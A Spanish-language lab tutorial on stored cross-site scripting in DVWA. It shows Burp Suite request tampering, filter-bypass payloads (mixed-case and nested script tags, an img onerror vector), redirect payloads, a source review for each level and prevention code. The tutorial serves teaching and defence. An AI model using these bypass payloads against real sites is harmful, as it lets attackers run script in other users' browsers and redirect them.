# Stored XSS — Cross-Site Scripting Almacenado

## Índice

1. [Stored XSS — Concepto](#1-stored-xss--concepto)
   - [Diferencia con Reflected XSS](#diferencia-con-reflected-xss)
2. [Stored XSS en acción](#2-stored-xss-en-acción)
   - [Nivel de seguridad Low](#nivel-de-seguridad-low)
     - [Bypass de la limitación de caracteres](#bypass-de-la-limitación-de-caracteres)
     - [Confirmación de la vulnerabilidad XSS](#confirmación-de-la-vulnerabilidad-xss)
     - [Redirección de usuario](#redirección-de-usuario)
   - [Nivel de seguridad Medium](#nivel-de-seguridad-medium)
     - [Análisis de los filtros por campo](#análisis-de-los-filtros-por-campo)
     - [Bypass y redirección](#bypass-y-redirección)
   - [Nivel de seguridad High](#nivel-de-seguridad-high)
     - [Bypass y redirección](#bypass-y-redirección-high)
3. [Revisión del código fuente](#3-revisión-del-código-fuente)
4. [Prevención](#4-prevención)

---

## 1. Stored XSS — Concepto

En las vulnerabilidades de tipo **Stored XSS**, el código malicioso **está almacenado en la aplicación** (por ejemplo en una base de datos) y se sirve a los clientes cuando acceden a la página vulnerable. A diferencia del Reflected XSS, el payload no va en la URL ni en la petición HTTP: vive dentro de la propia aplicación y se ejecuta automáticamente cada vez que un usuario carga la página infectada.

Ejemplos de aplicaciones susceptibles de tener Stored XSS:

- Aplicaciones web que permiten a los usuarios **hacer comentarios** (blogs, foros, libros de visitas).
- **Sistemas de tickets** de soporte, donde usuarios crean incidencias que serán leídas por personal técnico.
- **Perfiles de usuario** editables cuyo contenido se muestra a otros usuarios.
- Cualquier funcionalidad que **persista la entrada del usuario** y la muestre posteriormente a terceros.

Ejemplo de código PHP vulnerable:

```php
<?php
// Vulnerable: entrada sin validar ni codificar
if (isset($_POST['comentario'])) {
    $comentario = $_POST['comentario'];
    // Almacenar comentario en una base de datos
}
?>

<!-- Mostrar comentario en otra página -->
<div><?php echo $comentario; ?></div>
```

El problema está en la aceptación de la entrada de un usuario sin hacer ninguna validación o saneamiento. Si un atacante introduce `<script>código javascript</script>` en un comentario, ese código será ejecutado en el navegador de **cualquier otro usuario** en el momento de acceder al comentario.

### Diferencia con Reflected XSS

| Característica | Reflected XSS | Stored XSS |
|----------------|--------------|------------|
| Persistencia del payload | No (solo en la respuesta inmediata) | Sí (almacenado en BBDD) |
| Se requiere URL maliciosa | Sí | No |
| Afecta a | La víctima que hace clic en la URL | Todos los usuarios que visiten la página |
| Dificultad para el atacante | Hay que convencer a la víctima de hacer clic | Basta con insertar el payload y esperar |
| Impacto potencial | Un usuario | Múltiples usuarios de forma simultánea |

> **Importante:** En Stored XSS el atacante no tiene que inducir a la víctima a realizar una petición especial conteniendo el payload. Basta con colocarlo en la propia aplicación y esperar a que los usuarios hagan uso de ella. Esto hace que el Stored XSS sea considerado generalmente **más peligroso** que el Reflected XSS.

---

## 2. Stored XSS en acción

El objetivo es aprovecharse de la vulnerabilidad XSS almacenado para **redirigir a los usuarios** a una página de nuestra elección. El laboratorio empleado es DVWA con el módulo *XSS (Stored)*, que simula un libro de visitas (*GuestBook*) con campos `Name` y `Message`.

---

### Nivel de seguridad Low

Tras configurar el nivel de seguridad en DVWA a `low`, se accede a la sección de *XSS (Stored)* donde aparece un formulario con dos campos: `Name` y `Message`. Los datos introducidos persisten entre visitas: se puede navegar a otra sección de DVWA, regresar a *XSS (Stored)* y los datos siguen visibles. Esto confirma que **no se está ante un Reflected XSS** sino ante un posible Stored XSS.

![Dato almacenado](./imagenes/stored%20xss/01.png)

---

#### Bypass de la limitación de caracteres

Al intentar inyectar código HTML en el campo `Name`, aparece el primer problema: el campo tiene un límite de **10 caracteres** (`maxlength="10"`) que impide introducir payloads más largos:

![Limitación de caracteres](./imagenes/stored%20xss/02.png)

```html
<input name="txtName" type="text" size="30" maxlength="10">
```

> **Importante:** Esta limitación está implementada en el **lado del cliente** (atributo HTML `maxlength`), no en el servidor. Puede superarse fácilmente a través de las herramientas del programador o de Burp Suite. Las validaciones del lado del cliente nunca deben ser la única capa de defensa, ya que cualquier usuario puede eliminarlas trivialmente.

**Método 1 — Herramientas del programador:**

1. Abrir las herramientas del programador (`F12 → Inspector`).
2. Localizar la definición del campo de texto en el HTML.
3. Modificar el atributo `maxlength` aumentándolo al valor deseado (ej: `30`).

![Herramientas del programador](./imagenes/stored%20xss/03.png)

Tras la modificación es posible introducir valores como `<h1>Título</h1>` en el campo `Name`.

![HTML introducido](./imagenes/stored%20xss/04.png)

![HTML guardado](./imagenes/stored%20xss/05.png)


**Método 2 — Burp Suite:**

Se captura la petición POST y se manipula el cuerpo en Repeater:

1. Petición capturada.

```bash
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.100.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://192.168.100.4
Connection: keep-alive
Referer: http://192.168.100.4/dvwa/vulnerabilities/xss_s/
Cookie: PHPSESSID=3hmkqm124j7h2f85jk2tu6pa9c; security=low
Upgrade-Insecure-Requests: 1
Priority: u=0, i

txtName=Cualquier&mtxMessage=Cosa+para+probar+Burp+Suite&btnSign=Sign+Guestbook
```

2. Petición modificada.

```bash
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.100.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://192.168.100.4
Connection: keep-alive
Referer: http://192.168.100.4/dvwa/vulnerabilities/xss_s/
Cookie: PHPSESSID=3hmkqm124j7h2f85jk2tu6pa9c; security=low
Upgrade-Insecure-Requests: 1
Priority: u=0, i

txtName=<h1>Burp+Suite</h1>&mtxMessage=Prueba+con+Burp+Suite&btnSign=Sign+Guestbook
```

![XSS con Burp Suite](./imagenes/stored%20xss/06.png)

---

#### Confirmación de la vulnerabilidad XSS

Tras confirmar la inyección HTML en ambos campos, se revisa el código fuente de la página para identificar el **contexto de inyección**. La inyección se produce dentro de las etiquetas `<div>`:

```html
<!-- Sin inyección -->
<div id="guestbook_comments">Name: Martín<br />Message: Hola amigos<br /></div>

<!-- Con inyección HTML -->
<div id="guestbook_comments">Name: <h3>Martín</h3><br />Message: <h3>Hola amigos</h3><br /></div>
```

Conocido el contexto, se verifica la vulnerabilidad XSS con el payload:

```html
<script>alert('Ataque XSS')</script>
```

El payload se guarda en la base de datos y el código fuente de la respuesta muestra:

```html
<div id="guestbook_comments">Name: Ataque XSS<br />Message: <script>alert('Ataque XSS')</script><br /></div>
```

![Ataque XSS](./imagenes/stored%20xss/07.png)

El código Javascript se ejecuta y aparece la ventana emergente con `Ataque XSS`.

![Ejecución ataque XSS](./imagenes/stored%20xss/08.png)

> **Advertencia:** Las entradas del GuestBook se guardan en la base de datos, por lo que **cualquier usuario** de la aplicación que acceda al GuestBook va a cargar los mensajes y su navegador ejecutará el payload. Además, el payload se ejecutará **todas y cada una de las veces que se acceda a la página**, no solo la primera vez. Se puede verificar navegando a otra sección de DVWA y regresando a *XSS (Stored)*.

---

#### Redirección de usuario

Para redirigir a los usuarios a otra página existen distintos métodos en Javascript:

```html
<script>location.replace('https://www.google.com')</script>
<script>location.href='https://www.google.com'</script>
```

> **Importante:** Cuando se inserte el payload en el formulario y se guarde en la base de datos, **todo acceso a la página XSS (Stored) implicará que se ejecuta la redirección**, por lo que se perderá el acceso al botón `Clear Guestbook`, incluso para el atacante. Para recuperar el acceso hay varias opciones:
>
> - Instalar en el navegador usado como atacante una extensión tipo **NoScript** que permite bloquear la ejecución del código Javascript de la página.
> - Configurar el nivel de seguridad en `impossible` para deshabilitar la ejecución del payload y proceder al borrado del *guestbook*.
> - Mediante Burp Suite, reenviar a Repeater una solicitud de borrado del *guestbook* y emplearla cuando se quieran eliminar las entradas:
>
> ```http
> POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
> Cookie: security=low; PHPSESSID=gat1v1qh5nav1mebi1nirp864j
>
> txtName=&mtxMessage=&btnClear=Clear+Guestbook
> ```

Para insertar el payload de redirección es necesario superar de nuevo la limitación de `maxlength` (como se explicó anteriormente). Una vez guardado el payload:

```html
<script>location.href='https://www.google.com'</script>
```

Al cargarse la página con la nueva entrada del guestbook se ejecutará el payload, produciéndose la redirección de **todos los usuarios** que visiten la sección.

---

### Nivel de seguridad Medium

En el nivel de seguridad `medium` el programador introdujo sistemas de validación de entrada diferenciados por campo. Es importante analizar cada campo de forma independiente ya que el filtrado no es uniforme.

---

#### Análisis de los filtros por campo

**Campo `message`:**

La inyección de código HTML y el payload `<script>alert('XSS detectado')</script>` no funcionan. El código fuente de la respuesta muestra:

![No funciona XSS en message](./imagenes/stored%20xss/09.png)

```html
<div id="guestbook_comments">Name: intento1<br />Message: alert(\&#039;XSS detectado\&#039;)<br /></div>
```

No solo se eliminan las etiquetas `<script>`, sino que también se **escapan y codifican las comillas** (`\&#039;`). La sección `message` **no es buena candidata** para un ataque XSS en este nivel.

**Campo `name`:**

La inyección de código HTML funciona correctamente. Al probar el payload `<script>alert('XSS detectado')</script>`, el código fuente muestra:

![No funciona XSS en message](./imagenes/stored%20xss/10.png)

```html
<div id="guestbook_comments">Name: alert('XSS detectado')</script><br />Message: intento2<br /></div>
```

El filtro elimina únicamente la etiqueta `<script>` de apertura , lo que revela que se usa `str_replace()`, igual que en el nivel `medium` de Reflected XSS.

> **Recuerda:** `str_replace()` es sensible a mayúsculas/minúsculas y no aplica el filtro de forma recursiva. Estas dos debilidades permiten saltarlo con técnicas equivalentes a las vistas en Reflected XSS nivel medium.

**Técnicas de bypass para el campo `name`:**

| Técnica | Payload | Motivo por el que funciona |
|---------|---------|--------------------------|
| Mayúsculas | `<Script>alert('XSS')</Script>` | `str_replace()` es *case-sensitive* |
| Anidación | `<script<script>>alert('XSS')</script>` | Al eliminar el `<script>` interior queda un `<script>` válido |
| Anidación 2 | `<scr<script>ipt>alert('XSS')</script>` | Mismo principio que el anterior |

![Bypass de XSS en level medium](./imagenes/stored%20xss/11.png)

---

#### Bypass y redirección

Para conseguir la redirección se inserta el payload con mayúscula en el campo `name`:

```html
<Script>location.href='https://www.google.com'</script>
```

El payload supera el filtro de `str_replace()` y queda almacenado en la base de datos, ejecutándose en la siguiente carga de la página.

---

### Nivel de seguridad High

En el nivel de seguridad `high` el programador mejoró el sistema de filtrado. Las pruebas realizadas son:

**Prueba 1 — Inyección HTML:**
- `name`: permite inyección de código HTML (`<h3>Martín</h3>` funciona).
- `message`: elimina las etiquetas HTML.

**Prueba 2 — Payload con `<script>`:**
- `name`: se borran todos los payloads con `script`, incluyendo variantes con mayúsculas y con anidación, dejando únicamente el `>` final.
- `message`: se borran las etiquetas, se escapa `'` y se codifican caracteres especiales.

```html
<!-- Resultado de inyectar <script>alert('XSS detectado')</script> en name -->
<div id="guestbook_comments">Name: ><br />Message: alert(\&#039;XSS message\&#039;)<br /></div>
```

El comportamiento de `name` indica el uso de una **expresión regular** similar a la de Reflected XSS nivel `high`, que detecta apariciones de la palabra `script` (en cualquier variante) y elimina toda la cadena.

---

#### Bypass y redirección (High)

Dado que la expresión regular cubre todas las variantes de `<script>`, se emplea la técnica de la etiqueta `<img>` con evento `onerror`, que **prescinde completamente de las etiquetas script**:

```html
<img src=x onerror="alert('XSS detectado')">
```

![XSS en img](./imagenes/stored%20xss/12.png)
![XSS en img 2](./imagenes/stored%20xss/13.png)

| Parte del payload | Función |
|------------------|---------|
| `<img src=x` | Intenta insertar una imagen inexistente desde la ruta `x` |
| `onerror="..."` | Evento Javascript que se dispara cuando falla la carga de la imagen |
| El payload no contiene `script` | Esquiva completamente el filtro basado en regex |

Confirmada la vulnerabilidad, se borran las entradas anteriores y se inyecta el payload de redirección en el campo `name`:

```html
<img src=x onerror="location.href='https://www.google.com'">
```

El código fuente de la respuesta confirma que el payload se almacena correctamente:

```html
<div id="guestbook_comments">Name: <img src=x onerror="location.href='https://www.google.com'"><br />Message: redirect<br /></div>
```

Al cargar la página, la imagen falla al no existir la ruta `x`, el evento `onerror` se dispara y todos los usuarios son redirigidos.

> **Nota:** Este vector de ataque funciona porque la expresión regular está centrada exclusivamente en detectar la palabra `script`. Un filtro más completo debería cubrir también atributos de evento HTML como `onerror`, `onload`, `onmouseover`, `onclick`, etc. El enfoque de lista negra (*blacklist*) siempre es susceptible de ser saltado con nuevos vectores.

---

## 3. Revisión del código fuente

### Nivel Low — sin ninguna protección

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sin ningún filtrado adicional
    $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);
    $name    = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name);

    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
}
?>
```

Se usa `mysqli_real_escape_string()` para escapar caracteres especiales de cara a la consulta SQL (previniendo SQLi), pero **no se aplica ninguna codificación orientada a prevenir XSS**. El contenido se guarda y se recupera tal cual, ejecutándose en cualquier navegador que cargue la página.

> **Recuerda:** `mysqli_real_escape_string()` está diseñada para prevenir SQLi, no XSS. Son protecciones para amenazas distintas y no son intercambiables.

### Nivel Medium — filtros asimétricos e insuficientes

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Saneamiento del campo message (más completo)
    $message = strip_tags( addslashes( $message ) );
    $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);
    $message = htmlspecialchars( $message );

    // Saneamiento del campo name (incompleto)
    $name = str_replace( '<script>', '', $name );
    $name = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name);

    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
}
?>
```

Las funciones aplicadas a cada campo y sus limitaciones son:

**Campo `message`:**

| Función | Acción |
|---------|--------|
| `addslashes()` | Añade `\` delante de `'`, `"`, `\` y NULL |
| `strip_tags()` | Retira las etiquetas HTML y PHP del string |
| `htmlspecialchars()` | Convierte caracteres especiales en entidades HTML |

**Campo `name`:**

| Función | Acción | Limitación |
|---------|--------|-----------|
| `str_replace('<script>', '', ...)` | Elimina apariciones de `<script>` | Sensible a mayúsculas/minúsculas; no es recursiva |

> **Advertencia:** Los filtros del campo `message` son mucho más robustos que los del campo `name`. Esta asimetría es un error de diseño: un atacante que no pueda explotar un campo simplemente probará el otro.

### Nivel High — expresión regular insuficiente

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Saneamiento del campo message (igual que medium)
    $message = strip_tags( addslashes( $message ) );
    $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);
    $message = htmlspecialchars( $message );

    // Saneamiento del campo name (mejorado con regex)
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name);

    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
}
?>
```

El uso de `preg_replace()` con la flag `/i` resuelve el problema de la sensibilidad a mayúsculas/minúsculas y cubre variantes con caracteres intercalados. Sin embargo, el filtro sigue siendo **incompleto** porque solo cubre la palabra `script`, sin proteger contra otros vectores de ataque como etiquetas `<img>`, `<svg>`, `<iframe>` o atributos de evento HTML.

> **Recuerda:** Ningún filtro basado en lista negra (*blacklist*) puede cubrir todos los vectores de ataque XSS conocidos. OWASP recomienda usar **listas blancas** (*whitelists*) combinadas con codificación de salida como estrategia principal.

---

## 4. Prevención

El nivel de seguridad `impossible` de DVWA muestra las buenas prácticas. Se aplican los mismos controles a **ambos campos** (`name` y `message`), y se añade protección anti-CSRF:

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Validación del token Anti-CSRF
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Saneamiento del campo message
    $message = stripslashes( $message );
    $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);
    $message = htmlspecialchars( $message );

    // Saneamiento del campo name (mismo tratamiento que message)
    $name = stripslashes( $name );
    $name = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name);
    $name = htmlspecialchars( $name );

    // Consulta parametrizada
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

generateSessionToken();
?>
```

Con `htmlspecialchars()` aplicado a ambos campos, el payload de redirección se convierte en una cadena inofensiva que se muestra como texto literal:

```html
<!-- Entrada: <img src=x onerror="location.href='https://www.google.com'"> -->
<div id="guestbook_comments">
  Name: &lt;img src=x onerror=&quot;location.href=&#039;https://www.google.com&#039;&quot;&gt;<br />
  Message: redirect<br />
</div>
```

El navegador muestra el payload como texto visible en lugar de ejecutarlo, ya que `&lt;` se renderiza como `<` pero no como inicio de una etiqueta HTML.

![XSS imposible](./imagenes/stored%20xss/14.png)
![XSS imposible 2](./imagenes/stored%20xss/15.png)

Las **medidas de prevención específicas para Stored XSS** son las mismas que para Reflected XSS (codificación de salida, validación de entradas, CSP, atributos de cookies), con un matiz adicional muy importante:

> **Importante:** En Stored XSS el payload malicioso **vive dentro de la propia aplicación**. El atacante no tiene que inducir a ninguna víctima a realizar una acción concreta como la apertura de un enlace. Esto significa que las medidas de prevención deben centrarse especialmente en:
>
> - **Sanear la entrada en el momento de guardarla** en la base de datos.
> - **Codificar la salida en el momento de mostrarla** en cualquier contexto (HTML, Javascript, atributos, etc.).
> - **No confiar en ningún dato almacenado** en la base de datos, ya que podría haber sido insertado por un atacante en cualquier momento pasado.
> - **Aplicar los mismos controles a todos los campos** de entrada, sin dejar campos menos protegidos que otros.

> **Recuerda:** La codificación de salida (`htmlspecialchars()`, `htmlentities()`) es la contramedida más efectiva contra XSS. Convierte los caracteres que tienen significado especial en HTML en entidades inocuas, impidiendo que el navegador los interprete como código.
